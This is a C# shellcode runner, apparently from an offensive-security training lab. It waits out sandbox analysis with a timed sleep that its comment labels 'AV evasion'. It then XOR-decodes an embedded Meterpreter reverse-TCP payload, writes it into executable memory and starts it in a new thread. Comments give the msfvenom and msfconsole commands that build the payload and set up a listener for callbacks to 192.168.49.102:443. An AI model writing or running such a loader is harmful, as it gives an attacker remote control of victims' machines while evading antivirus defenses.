﻿using System.Runtime.InteropServices;
using System;

namespace rev
{
    public class Program
    {
        public const uint EXECUTEREADWRITE  = 0x40;
        public const uint COMMIT_RESERVE = 0x3000;

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

        [DllImport("Kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private unsafe static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern Int32 WaitForSingleObject(IntPtr Handle, Int32 Wait);

        public static void Main()
        {
            // AV evasion: Sleep for 10s and detect if time really passed
            DateTime t1 = DateTime.Now;
            Sleep(10000);
            double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
            if (deltaT < 9.5)
            {
                return;
            }

            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.49.102 LPORT=443 EXITFUNC=thread -f ps1
            // XORed with xor_shellcode.py key 0xfa
            // sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.49.102; set lport 443; exploit"
            //byte[] buf = new byte[511] {
            //0x06,0xb2,0x79,0x1e,0x0a,0x12,0x36,0xfa,0xfa,0xfa,0xbb,0xab,
            //0xbb,0xaa,0xa8,0xab,0xac,0xb2,0xcb,0x28,0x9f,0xb2,0x71,0xa8,
            //0x9a,0xb2,0x71,0xa8,0xe2,0xb2,0x71,0xa8,0xda,0xb2,0x71,0x88,
            //0xaa,0xb2,0xf5,0x4d,0xb0,0xb0,0xb7,0xcb,0x33,0xb2,0xcb,0x3a,
            //0x56,0xc6,0x9b,0x86,0xf8,0xd6,0xda,0xbb,0x3b,0x33,0xf7,0xbb,
            //0xfb,0x3b,0x18,0x17,0xa8,0xbb,0xab,0xb2,0x71,0xa8,0xda,0x71,
            //0xb8,0xc6,0xb2,0xfb,0x2a,0x9c,0x7b,0x82,0xe2,0xf1,0xf8,0xf5,
            //0x7f,0x88,0xfa,0xfa,0xfa,0x71,0x7a,0x72,0xfa,0xfa,0xfa,0xb2,
            //0x7f,0x3a,0x8e,0x9d,0xb2,0xfb,0x2a,0xbe,0x71,0xba,0xda,0xaa,
            //0x71,0xb2,0xe2,0xb3,0xfb,0x2a,0x19,0xac,0xb2,0x05,0x33,0xbb,
            //0x71,0xce,0x72,0xb2,0xfb,0x2c,0xb7,0xcb,0x33,0xb2,0xcb,0x3a,
            //0x56,0xbb,0x3b,0x33,0xf7,0xbb,0xfb,0x3b,0xc2,0x1a,0x8f,0x0b,
            //0xb6,0xf9,0xb6,0xde,0xf2,0xbf,0xc3,0x2b,0x8f,0x22,0xa2,0xbe,
            //0x71,0xba,0xde,0xb3,0xfb,0x2a,0x9c,0xbb,0x71,0xf6,0xb2,0xbe,
            //0x71,0xba,0xe6,0xb3,0xfb,0x2a,0xbb,0x71,0xfe,0x72,0xb2,0xfb,
            //0x2a,0xbb,0xa2,0xbb,0xa2,0xa4,0xa3,0xa0,0xbb,0xa2,0xbb,0xa3,
            //0xbb,0xa0,0xb2,0x79,0x16,0xda,0xbb,0xa8,0x05,0x1a,0xa2,0xbb,
            //0xa3,0xa0,0xb2,0x71,0xe8,0x13,0xb1,0x05,0x05,0x05,0xa7,0xb3,
            //0x44,0x8d,0x89,0xc8,0xa5,0xc9,0xc8,0xfa,0xfa,0xbb,0xac,0xb3,
            //0x73,0x1c,0xb2,0x7b,0x16,0x5a,0xfb,0xfa,0xfa,0xb3,0x73,0x1f,
            //0xb3,0x46,0xf8,0xfa,0xfb,0x41,0x3a,0x52,0xcb,0x9c,0xbb,0xae,
            //0xb3,0x73,0x1e,0xb6,0x73,0x0b,0xbb,0x40,0xb6,0x8d,0xdc,0xfd,
            //0x05,0x2f,0xb6,0x73,0x10,0x92,0xfb,0xfb,0xfa,0xfa,0xa3,0xbb,
            //0x40,0xd3,0x7a,0x91,0xfa,0x05,0x2f,0x90,0xf0,0xbb,0xa4,0xaa,
            //0xaa,0xb7,0xcb,0x33,0xb7,0xcb,0x3a,0xb2,0x05,0x3a,0xb2,0x73,
            //0x38,0xb2,0x05,0x3a,0xb2,0x73,0x3b,0xbb,0x40,0x10,0xf5,0x25,
            //0x1a,0x05,0x2f,0xb2,0x73,0x3d,0x90,0xea,0xbb,0xa2,0xb6,0x73,
            //0x18,0xb2,0x73,0x03,0xbb,0x40,0x63,0x5f,0x8e,0x9b,0x05,0x2f,
            //0x7f,0x3a,0x8e,0xf0,0xb3,0x05,0x34,0x8f,0x1f,0x12,0x69,0xfa,
            //0xfa,0xfa,0xb2,0x79,0x16,0xea,0xb2,0x73,0x18,0xb7,0xcb,0x33,
            //0x90,0xfe,0xbb,0xa2,0xb2,0x73,0x03,0xbb,0x40,0xf8,0x23,0x32,
            //0xa5,0x05,0x2f,0x79,0x02,0xfa,0x84,0xaf,0xb2,0x79,0x3e,0xda,
            //0xa4,0x73,0x0c,0x90,0xba,0xbb,0xa3,0x92,0xfa,0xea,0xfa,0xfa,
            //0xbb,0xa2,0xb2,0x73,0x08,0xb2,0xcb,0x33,0xbb,0x40,0xa2,0x5e,
            //0xa9,0x1f,0x05,0x2f,0xb2,0x73,0x39,0xb3,0x73,0x3d,0xb7,0xcb,
            //0x33,0xb3,0x73,0x0a,0xb2,0x73,0x20,0xb2,0x73,0x03,0xbb,0x40,
            //0xf8,0x23,0x32,0xa5,0x05,0x2f,0x79,0x02,0xfa,0x87,0xd2,0xa2,
            //0xbb,0xad,0xa3,0x92,0xfa,0xba,0xfa,0xfa,0xbb,0xa2,0x90,0xfa,
            //0xa0,0xbb,0x40,0xf1,0xd5,0xf5,0xca,0x05,0x2f,0xad,0xa3,0xbb,
            //0x40,0x8f,0x94,0xb7,0x9b,0x05,0x2f,0xb3,0x05,0x34,0x13,0xc6,
            //0x05,0x05,0x05,0xb2,0xfb,0x39,0xb2,0xd3,0x3c,0xb2,0x7f,0x0c,
            //0x8f,0x4e,0xbb,0x05,0x1d,0xa2,0x90,0xfa,0xa3,0x41,0x1a,0xe7,
            //0xd0,0xf0,0xbb,0x73,0x20,0x05,0x2f};
            byte[] buf = new byte[511] { 0x0b, 0xb7, 0x7e, 0x23, 0x0f, 0x17, 0x3b, 0xff, 0xff, 0xff, 0xc0, 0xb0, 0xc0, 0xaf, 0xad, 0xb0, 0xb1, 0xb7, 0xd0, 0x2d, 0xa4, 0xb7, 0x76, 0xad, 0x9f, 0xb7, 0x76, 0xad, 0xe7, 0xb7, 0x76, 0xad, 0xdf, 0xb7, 0x76, 0x8d, 0xaf, 0xb7, 0xfa, 0x52, 0xb5, 0xb5, 0xbc, 0xd0, 0x38, 0xb7, 0xd0, 0x3f, 0x5b, 0xcb, 0xa0, 0x8b, 0xfd, 0xdb, 0xdf, 0xc0, 0x40, 0x38, 0xfc, 0xc0, 0x00, 0x40, 0x1d, 0x1c, 0xad, 0xc0, 0xb0, 0xb7, 0x76, 0xad, 0xdf, 0x76, 0xbd, 0xcb, 0xb7, 0x00, 0x2f, 0xa1, 0x80, 0x87, 0xe7, 0xf6, 0xfd, 0xfa, 0x84, 0x8d, 0xff, 0xff, 0xff, 0x76, 0x7f, 0x77, 0xff, 0xff, 0xff, 0xb7, 0x84, 0x3f, 0x93, 0xa2, 0xb7, 0x00, 0x2f, 0xc3, 0x76, 0xbf, 0xdf, 0xaf, 0x76, 0xb7, 0xe7, 0xb8, 0x00, 0x2f, 0x1e, 0xb1, 0xb7, 0x0a, 0x38, 0xc0, 0x76, 0xd3, 0x77, 0xb7, 0x00, 0x31, 0xbc, 0xd0, 0x38, 0xb7, 0xd0, 0x3f, 0x5b, 0xc0, 0x40, 0x38, 0xfc, 0xc0, 0x00, 0x40, 0xc7, 0x1f, 0x94, 0x10, 0xbb, 0xfe, 0xbb, 0xe3, 0xf7, 0xc4, 0xc8, 0x30, 0x94, 0x27, 0xa7, 0xc3, 0x76, 0xbf, 0xe3, 0xb8, 0x00, 0x2f, 0xa1, 0xc0, 0x76, 0xfb, 0xb7, 0xc3, 0x76, 0xbf, 0xeb, 0xb8, 0x00, 0x2f, 0xc0, 0x76, 0x03, 0x77, 0xb7, 0x00, 0x2f, 0xc0, 0xa7, 0xc0, 0xa7, 0xa9, 0xa8, 0xa5, 0xc0, 0xa7, 0xc0, 0xa8, 0xc0, 0xa5, 0xb7, 0x7e, 0x1b, 0xdf, 0xc0, 0xad, 0x0a, 0x1f, 0xa7, 0xc0, 0xa8, 0xa5, 0xb7, 0x76, 0xed, 0x18, 0xb6, 0x0a, 0x0a, 0x0a, 0xac, 0xb8, 0x49, 0x92, 0x8e, 0xcd, 0xaa, 0xce, 0xcd, 0xff, 0xff, 0xc0, 0xb1, 0xb8, 0x78, 0x21, 0xb7, 0x80, 0x1b, 0x5f, 0x00, 0xff, 0xff, 0xb8, 0x78, 0x24, 0xb8, 0x4b, 0xfd, 0xff, 0x00, 0x46, 0x3f, 0x57, 0xd0, 0xa1, 0xc0, 0xb3, 0xb8, 0x78, 0x23, 0xbb, 0x78, 0x10, 0xc0, 0x45, 0xbb, 0x92, 0xe1, 0x02, 0x0a, 0x34, 0xbb, 0x78, 0x15, 0x97, 0x00, 0x00, 0xff, 0xff, 0xa8, 0xc0, 0x45, 0xd8, 0x7f, 0x96, 0xff, 0x0a, 0x34, 0x95, 0xf5, 0xc0, 0xa9, 0xaf, 0xaf, 0xbc, 0xd0, 0x38, 0xbc, 0xd0, 0x3f, 0xb7, 0x0a, 0x3f, 0xb7, 0x78, 0x3d, 0xb7, 0x0a, 0x3f, 0xb7, 0x78, 0x40, 0xc0, 0x45, 0x15, 0xfa, 0x2a, 0x1f, 0x0a, 0x34, 0xb7, 0x78, 0x42, 0x95, 0xef, 0xc0, 0xa7, 0xbb, 0x78, 0x1d, 0xb7, 0x78, 0x08, 0xc0, 0x45, 0x68, 0x64, 0x93, 0xa0, 0x0a, 0x34, 0x84, 0x3f, 0x93, 0xf5, 0xb8, 0x0a, 0x39, 0x94, 0x24, 0x17, 0x6e, 0xff, 0xff, 0xff, 0xb7, 0x7e, 0x1b, 0xef, 0xb7, 0x78, 0x1d, 0xbc, 0xd0, 0x38, 0x95, 0x03, 0xc0, 0xa7, 0xb7, 0x78, 0x08, 0xc0, 0x45, 0xfd, 0x28, 0x37, 0xaa, 0x0a, 0x34, 0x7e, 0x07, 0xff, 0x89, 0xb4, 0xb7, 0x7e, 0x43, 0xdf, 0xa9, 0x78, 0x11, 0x95, 0xbf, 0xc0, 0xa8, 0x97, 0xff, 0xef, 0xff, 0xff, 0xc0, 0xa7, 0xb7, 0x78, 0x0d, 0xb7, 0xd0, 0x38, 0xc0, 0x45, 0xa7, 0x63, 0xae, 0x24, 0x0a, 0x34, 0xb7, 0x78, 0x3e, 0xb8, 0x78, 0x42, 0xbc, 0xd0, 0x38, 0xb8, 0x78, 0x0f, 0xb7, 0x78, 0x25, 0xb7, 0x78, 0x08, 0xc0, 0x45, 0xfd, 0x28, 0x37, 0xaa, 0x0a, 0x34, 0x7e, 0x07, 0xff, 0x8c, 0xd7, 0xa7, 0xc0, 0xb2, 0xa8, 0x97, 0xff, 0xbf, 0xff, 0xff, 0xc0, 0xa7, 0x95, 0xff, 0xa5, 0xc0, 0x45, 0xf6, 0xda, 0xfa, 0xcf, 0x0a, 0x34, 0xb2, 0xa8, 0xc0, 0x45, 0x94, 0x99, 0xbc, 0xa0, 0x0a, 0x34, 0xb8, 0x0a, 0x39, 0x18, 0xcb, 0x0a, 0x0a, 0x0a, 0xb7, 0x00, 0x3e, 0xb7, 0xd8, 0x41, 0xb7, 0x84, 0x11, 0x94, 0x53, 0xc0, 0x0a, 0x22, 0xa7, 0x95, 0xff, 0xa8, 0x46, 0x1f, 0xec, 0xd5, 0xf5, 0xc0, 0x78, 0x25, 0x0a, 0x34 };
            int payloadSize = buf.Length;
            IntPtr payAddr = VirtualAlloc(IntPtr.Zero, payloadSize, COMMIT_RESERVE, EXECUTEREADWRITE);
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }
            Marshal.Copy(buf, 0, payAddr, payloadSize);
            IntPtr payThreadId = CreateThread(IntPtr.Zero, 0, payAddr, IntPtr.Zero, 0, 0);
            int waitResult = WaitForSingleObject(payThreadId, -1);
        }
    }
}